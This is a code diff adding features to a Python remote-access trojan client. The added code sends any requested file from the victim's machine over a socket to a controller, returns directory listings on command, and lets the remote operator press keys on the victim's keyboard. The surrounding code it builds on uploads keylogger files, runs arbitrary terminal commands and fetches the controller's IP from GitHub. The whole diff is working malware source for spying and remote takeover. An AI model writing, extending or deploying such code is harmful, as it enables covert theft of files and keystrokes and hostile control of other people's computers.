@@ -319,8 +319,45 @@ def sendFileKeylogger():
         content = file.read()
         Socket.sendall((content+"end").encode())
 
+def sendAllTypeFile(filepath):
+    SEPARATOR = "<SEPARATOR>"
+    BUFFER_SIZE = 4096
+    filesize = os.path.getsize(filepath)
+    filename = os.path.basename(filepath)
+    print(f"{filename}{SEPARATOR}{filesize}")
+    Socket.send(f"{filename}{SEPARATOR}{filesize}".encode())
+    Socket.recv(1)
+    with open(filepath, "rb") as f:
+        while True:
+            # read the bytes from the file
+            bytes_read = f.read(BUFFER_SIZE)
+            if not bytes_read:
+                # file transmitting is done
+                break
+            # we use sendall to assure transimission in 
+            # busy networks
+            Socket.sendall(bytes_read)
+
+def stopSpaceError(data):
+    import re
+    return " ".join(re.split(r"\s+", (re.sub(r"^\s+|\s+$", "", data))))
+
+def controlDevice():
+    from pynput.keyboard import Controller
+    keyboard = Controller()
+    while True:
+        try:
+            data = stopSpaceError(Socket.recv(6).decode().replace("9", ""))
+            print(data)
+            if data == "end":
+                break
+            keyboard.press(data)
+            print("testtttt")
+        except:
+            pass
+
 def execute(data):
-    global run, sortir, ossys, reloading, sendListenKeylogger
+    global run, sortir, ossys, reloading, sendListenKeylogger, PATHShowDir
     if not data:
         return False, False
     data = data.replace("9", "")
@@ -334,6 +371,19 @@ def execute(data):
             return False, False
         elif data[0:2] == "cd":
             cdAccess(data[3:len(data)])
+        elif datalist[0] == "CdSeeDir":
+            try:
+                os.chdir(datalist[1])
+                Socket.sendall(("\n".join(os.listdir(os.getcwd()))+"\n"+os.getcwd()+"end").encode())
+            except:
+                Socket.sendall("the dir dosn't exist in this directory end".encode())
+        elif datalist[0] == "dlFile":
+            sendAllTypeFile(os.getcwd()+"/"+datalist[1])
+        elif datalist[0] == "CdSeeDirToSelfFile":
+            os.chdir(os.path.abspath(__file__))
+            Socket.sendall(("\n".join(os.listdir(os.getcwd()))+"\n"+os.getcwd()+"end").encode())
+        elif data == "displayListFile":
+            Socket.sendall(("\n".join(os.listdir(os.getcwd()))+"\n"+os.getcwd()+"end").encode())
         elif data[0:6] == "write(":
             write(data[6:len(data) - 1])
         elif data[0:6] == "press(":
@@ -373,6 +423,11 @@ def execute(data):
             pass
         elif data == "sendFileKeylogger":
             sendFileKeylogger()
+        elif data == "move into file":
+            os.chdir("\\".join(os.path.abspath(__file__).split('\\')[:3]))
+            Socket.sendall(("\n".join(os.listdir(os.getcwd()))+"\n"+os.getcwd()).encode())
+        elif data == "controlDevice":
+            controlDevice()
         else:
             terminal(data)
     return True, True
@@ -436,7 +491,6 @@ while True:
     sendListenKeylogger = False
     ipScreen = f.getByGithub(f"{githubUrl}ip").replace("\n", "")
     print(ipScreen)
-    print("ready")
     BREAK = False
     run = True
     try:
@@ -447,8 +501,13 @@ while True:
         run = False
         pass
     if run:
+        print("ready")
         while True:
-            progrun, run = execute(receive(timeoutKill))
+            try:
+                progrun, run = execute(receive(timeoutKill))
+            except Exception as e:
+                print("error")
+                print(e)
             if not run or not progrun:
                 break
         if not progrun:
